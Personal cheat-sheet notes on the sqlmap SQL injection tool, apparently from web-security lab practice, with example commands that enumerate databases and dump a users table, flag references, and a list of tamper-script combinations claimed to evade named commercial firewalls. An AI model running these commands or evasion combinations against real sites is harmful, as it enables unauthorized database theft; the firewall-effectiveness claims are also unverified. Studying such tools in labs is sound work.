***SQLMap has been installed on this PC and the path has been added in Environment Variable so that it can be called from anywhere using python sqlmap.py 
Furthermore, a batch file has been added so that just 'sqlmap' will work as a command

Best use would be to save item to the sqlmap folder in C:\Users\naisa\sqlmap and cd into that directory to run sqlmap using the -r flag

***If testing a function that is only available to a logged in user, specify the session cookie:   `--cookie="name=value" Can also add headers and CSRF tokens: --headers="X-Forwarded-For: 127.0.0.1" --csrf-token=token

e.g. 

sqlmap -r lab_sqli1 -p category --batch --dbs --threads=10    
***this gets the databases

sqlmap -r lab_sqli1 -p category --batch --dbms postgresql --threads=10 -D public --tables     
***then select one of the databases, e.g. public in this case, with -D flag and --tables to get tables

sqlmap -r lab_sqli1 -p category --batch --dbms postgresql --threads=10 -D public -T users_lyujvh --dump
***using the database and table name,  and --dump to dump the contents on the CLI. Can also use --columns, then -C col1, col2

***When testing Cookie header for vulnerability, must use a higher level

Add `--level=2` or higher. 👉 Cookies are only tested at **level ≥ 2**

E.g.
sqlmap -r lab_sqli2 -p TrackingId --batch --dbms oracle,mssql,postgresql,mysql --dbs --threads=10 --level=5 --risk=3

XML with hex_entity encoding
sqlmap -r lab_xmlsqli1 -p storeId --batch --dbms postgresql --dbs --threads=10 --level=5 --risk=3 --technique=U --tamper=hexentities




# Basic Targeting

These define what you’re testing.

- `-u "<URL>"` → Target URL
- `-r <request.txt>` → Use a saved HTTP request (from Burp, etc.)
- `-p <param>` → Specify parameter(s) to test
- `--data="<POST data>"` → Send POST request
- `--cookie="name=value"` → Add cookies
- `--headers="Header: value"` → Custom headers

# Injection Control

Tell sqlmap how aggressive or specific to be.

- `--level=1-5` → How many parameters to test (default: 1)
- `--risk=1-3` → Risk of payloads (default: 1)
- `--technique=BEUSTQ` → Injection types:
    - B = Boolean-based
    - E = Error-based
    - U = UNION
    - S = Stacked queries
    - T = Time-based
    - Q = Inline queries
### What changes with higher levels:

| Level       | What SQLMap tests       |
| ----------- | ----------------------- |
| 1 (default) | Basic GET/POST params   |
| 2           | + Cookies               |
| 3           | + User-Agent            |
| 4           | + Referer               |
| 5           | + Host + deeper testing |
## ✅ **Risk 1 (default — safest & fastest)**

- Basic, non-intrusive payloads
- No heavy queries
- Minimal chance of breaking anything

👉 Fast and safe, but may miss some injections

---

## ⚡ **Risk 2 (moderate)**

- Adds more complex payloads
- Includes heavier SQL operations
- Slightly more intrusive

👉 Better detection, slightly slower

---

## 🔥 **Risk 3 (aggressive)**

- Uses **OR-based injections** and heavy queries
- Can trigger:
    - Large database scans
    - Expensive operations
- May:
    - Slow down the server
    - Modify data in rare cases

👉 Most powerful, but **slowest and riskiest**
# Detection & Speed

Control detection behavior and performance.

- `--threads=<num>` → Number of concurrent requests
- `--delay=<sec>` → Delay between requests
- `--timeout=<sec>` → Request timeout
- `--retries=<num>` → Retry failed requests
- `--random-agent` → Use random User-Agent
- `--proxy="http://127.0.0.1:8080"` → Route through proxy

# Enumeration (Data Extraction)

Once vulnerable, extract info:

- `--dbs` → List databases
- `--tables` → List tables
- `--columns` → List columns
- `--dump` → Dump table data
- `-D <db>` → Select database
- `-T <table>` → Select table
- `-C <columns>` → Select columns
- --search → Search for identifier names e.g. --search -T username

# Authentication / Sessions

For logged-in areas:

- `--cookie="PHPSESSID=..."`
- `--auth-type` (Basic, Digest, etc.)
- `--auth-cred="user:pass"`

# Utility / Quality of Life

- `--batch` → Auto-answer prompts (non-interactive)
- `--flush-session` → Clear previous session
- `--fresh-queries` → Ignore cached results
- `--output-dir=<path>` → Save results

### Sqlmap WAF Bypass Tips (Works for Me Every Time)

- Use — tamper with one or more scripts (comma-separated) to obfuscate payloads and evade signature-based rules. Popular effective ones include:

--tamper=between,randomcase,space2comment                 
Effective on: ModSecurity, Cloudflare, F5 ASM  
--tamper=space2comment,space2morehash                     
Effective on: ModSecurity, Imperva SecureSphere  
--tamper=modsecurityversioned,space2comment               
Effective on: ModSecurity, Comodo WAF  
--tamper=space2comment,between,randomcase,charencode      
Effective on: Cloudflare, Akamai, Sucuri  
--tamper=space2comment,randomcase,unmagicquotes           
Effective on: PHP WAFs, Wordfence, LiteSpeed  
--tamper=space2comment,between,percentage                
Effective on: Imperva, Barracuda  
--tamper=charencode,randomcase,space2comment             
Effective on: Cloudflare, F5 ASM, Radware  
--tamper=space2plus,space2comment,randomcase              
Effective on: Akamai, Sucuri, StackPath  
--tamper=between,space2comment,modsecurityzeroversioned   
Effective on: ModSecurity, Comodo  
--tamper=space2comment,randomcase,apostrophemask          
Effective on: Imperva, Cloudflare  
--tamper=charunicodeencode,space2comment,randomcase       
Effective on: Akamai, Radware, Azure WAF  
--tamper=space2comment,between,randomcase,bluecoat        
Effective on: BlueCoat / Symantec WAF  
--tamper=space2comment,between,randomcase,equaltolike     
Effective on: F5 ASM, Citrix NetScaler  
--tamper=space2comment,randomcase,overlongutf8            
Effective on: FortiWeb, Legacy ModSecurity rules

- Use — ignore-code=401,403 (or other block codes) so SQLMap doesn’t stop when the WAF interferes.